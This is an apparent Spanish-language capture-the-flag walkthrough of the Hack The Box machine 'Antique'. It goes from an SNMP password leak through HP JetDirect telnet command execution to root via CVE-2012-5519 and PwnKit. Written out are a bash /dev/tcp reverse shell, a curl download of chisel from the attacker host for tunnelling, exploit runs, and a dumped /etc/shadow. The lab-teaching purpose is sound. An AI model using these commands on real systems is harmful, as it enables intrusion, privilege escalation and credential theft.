---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Antique

`Antique` es una máquina Linux sencilla que cuenta con una impresora de red que revela credenciales a través de una cadena SNMP que permite iniciar sesión en el servicio Telnet. Se puede obtener acceso mediante la explotación de una característica de la impresora. El servicio de administración CUPS se ejecuta localmente. Este servicio se puede explotar aún más para obtener acceso raíz en el servidor.

<figure><img src="../../.gitbook/assets/Antique.png" alt="" width="563"><figcaption></figcaption></figure>

***



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 01:15 CET
Initiating SYN Stealth Scan at 01:15
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 01:15, 22.04s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.050s latency).
Scanned at 2025-01-27 01:15:02 CET for 22s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds
           Raw packets sent: 66438 (2.923MB) | Rcvd: 66448 (2.658MB)
```





```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.107
	[*] Open ports: 23

[*] Ports copied to clipboard
```





```bash
❯ nmap -sCV -p23 10.10.11.107 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 01:15 CET
Nmap scan report for 10.10.11.107
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.95%I=7%D=1/27%Time=6796D03A%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   61.73 ms 10.10.16.1
2   32.26 ms 10.10.11.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.36 seconds
```





```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/4215_vmware_PQkDWPd5VH.png" alt=""><figcaption></figcaption></figure>



```bash
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: 
Invalid password
Connection closed by foreign host.
```



```bash
❯ nmap --top-ports 100 --open -sU -vvv -Pn -n 10.10.11.107
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 01:18 CET
Initiating UDP Scan at 01:18
Scanning 10.10.11.107 [100 ports]
Increasing send delay for 10.10.11.107 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.107 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.107 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.107 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.107 from 400 to 800 due to max_successful_tryno increase to 8
UDP Scan Timing: About 42.70% done; ETC: 01:19 (0:00:42 remaining)
Increasing send delay for 10.10.11.107 from 800 to 1000 due to 11 out of 18 dropped probes since last increase.
Discovered open port 161/udp on 10.10.11.107
Completed UDP Scan at 01:19, 100.03s elapsed (100 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.033s latency).
Scanned at 2025-01-27 01:18:13 CET for 100s
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 100.14 seconds
           Raw packets sent: 263 (14.720KB) | Rcvd: 213 (16.669KB)
```





```bash
❯ snmpwalk -v 2c -c public 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"

❯ snmpwalk -v 2c -c public 10.10.11.107 1
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```



{% embed url="https://www.irongeek.com/i.php?page=security/networkprinterhacking" %}

<figure><img src="../../.gitbook/assets/imagen (282).png" alt=""><figcaption></figcaption></figure>



```bash
❯ snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
```



```basic
❯ echo '50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135' | xxd -r -p; echo
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i	IY�aA�"1&1A5
```



```bash
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
> exec bash -c 'bash -i >& /dev/tcp/10.10.16.5/443 0>&1'
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.107] 55082
bash: cannot set terminal process group (1022): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ cat /home/lp/user.txt
cat /home/lp/user.txt
bfd3482a0da78068976acc9a896797ba
```



```bash
lp@antique:~$ netstat -ano | grep LISTEN
netstat -ano | grep LISTEN
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:631                 :::*                    LISTEN      off (0.00/0/0)
```







```bash
❯ ./chisel server --reverse -p 1234
2025/01/27 01:30:49 server: Reverse tunnelling enabled
2025/01/27 01:30:49 server: Fingerprint 2rgce5eKdOw74ibZ3pEyZ2xkaiDbBwAUWRjYfuZs7kI=
2025/01/27 01:30:49 server: Listening on http://0.0.0.0:1234
```





```bash
❯ ls -l chisel
.rwxr-xr-x kali kali 8.9 MB Mon Jan 27 01:30:46 2025  chisel
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
lp@antique:/tmp$ curl http://10.10.16.5/chisel -o /tmp/chisel
curl http://10.10.16.5/chisel -o /tmp/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 9152k  100 9152k    0     0  2934k      0  0:00:03  0:00:03 --:--:-- 2933k
lp@antique:/tmp$ chmod +x chisel
chmod +x chisel
lp@antique:/tmp$ ./chisel client 10.10.16.5:1234 R:631:127.0.0.1:631
./chisel client 10.10.16.5:1234 R:631:127.0.0.1:631
2025/01/27 00:33:11 client: Connecting to ws://10.10.16.5:1234
2025/01/27 00:33:11 client: Connected (Latency 32.031023ms)
```



<figure><img src="../../.gitbook/assets/imagen (283).png" alt=""><figcaption></figcaption></figure>





{% embed url="https://github.com/p1ckzi/CVE-2012-5519" %}

```bash
lp@antique:/tmp$ ls -l exploit.sh
ls -l exploit.sh
-rwxrwxr-x 1 lp lp 13028 Jan 27 00:39 exploit.sh
lp@antique:/tmp$ ./exploit.sh 
./exploit.sh
                                            _
  ___ _   _ _ __  ___       _ __ ___   ___ | |_
 / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____
| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|
 \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|
 / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__
| |_| | |/ _ \_____| '__/ _ \/ _` |/ _` | / __| '_ \ 
|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |
|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|
a bash implementation of CVE-2012-5519 for linux.

[i] performing checks...
[i] checking for cupsctl command...
[+] cupsctl binary found in path.
[i] checking cups version...
[+] using cups 1.6.1. version may be vulnerable.
[i] checking user lp in lpadmin group...
[+] user part of lpadmin group.
[i] checking for curl command...
[+] curl binary found in path.
[+] all checks passed.

[!] warning!: this script will set the group ownership of
[!] viewed files to user 'lp'.
[!] files will be created as root and with group ownership of
[!] user 'lp' if a nonexistant file is submitted.
[!] changes will be made to /etc/cups/cups.conf file as part of the
[!] exploit. it may be wise to backup this file or copy its contents
[!] before running the script any further if this is a production
[!] environment and/or seek permissions beforehand.
[!] the nature of this exploit is messy even if you know what you're looking for.

[i] usage:
	input must be an absolute path to an existing file.
	eg.
	1. /root/.ssh/id_rsa
	2. /root/.bash_history
	3. /etc/shadow
	4. /etc/sudoers ... etc.
[i] ./exploit.sh commands:
	type 'info' for exploit details.
	type 'help' for this dialog text.
	type 'quit' to exit the script.
[i] for more information on the limitations
[i] of the script and exploit, please visit:
[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
[>] /root/root.txt
[+] contents of /root/root.txt:
dd7f80890d84993ab6f93e0cded15740
```



```bash
[>] /etc/shadow
[+] contents of /etc/shadow:
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
```



{% embed url="https://github.com/joeammond/CVE-2021-4034/" %}

```
lp@antique:/tmp$ python3 exploit.py
python3 exploit.py
id
uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)
bash
whoami
root
script /dev/null -c bash
Script started, file is /dev/null
root@antique:/tmp#
```

